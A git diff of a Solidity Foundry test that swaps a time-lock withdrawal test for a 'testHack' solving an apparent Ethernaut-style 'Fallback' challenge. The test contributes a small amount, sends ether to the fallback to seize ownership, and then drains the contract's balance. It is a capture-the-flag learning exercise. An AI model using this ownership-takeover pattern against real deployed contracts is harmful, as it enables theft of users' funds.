@@ -4,21 +4,27 @@ import "forge-std/Test.sol";
 import "src/Fallback.sol";
 
 
-contract LockTest is Test {
-    Lock private lock;
-    address private constant ALICE = address(0x1);
-    uint private UNLOCKTIME = block.timestamp + 10 * 24* 3600; // in 10 days
+contract FallbackTest is Test {
+    Fallback private flk;
+    address private constant HACKER = address(0x1);
     function setUp() external {
-        vm.deal(ALICE, 10e18);
-        vm.startPrank(ALICE);
-        lock = (new Lock){value: 2e18}(UNLOCKTIME);
+        flk = new Fallback();
+        vm.deal(HACKER, 10e18);
+        vm.startPrank(HACKER);
+        
     }
 
-    function testWithdraw() external {
-        vm.warp(UNLOCKTIME + 11); // 11 days
-        (bool success, ) = address(lock).call(abi.encodeWithSignature("withdraw()"));
+    function testHack() external {
+        (bool success,) = address(flk).call{value: 1e14}(abi.encodeWithSignature("contribute()"));
         require(success, "tx failed");
-        vm.stopPrank();
-        assertEq(address(lock).balance, 0);
+        (bool success1,) = address(flk).call{value: 1e15}("");
+        require(success1, "tx1 failed");
+
+        assertEq(flk.owner(), HACKER);
+        
+        (bool success2,) = address(flk).call(abi.encodeWithSignature("withdraw()"));
+        require(success2, "tx2 failed");
+        
+        assertEq(address(flk).balance, 0);
     }
 }
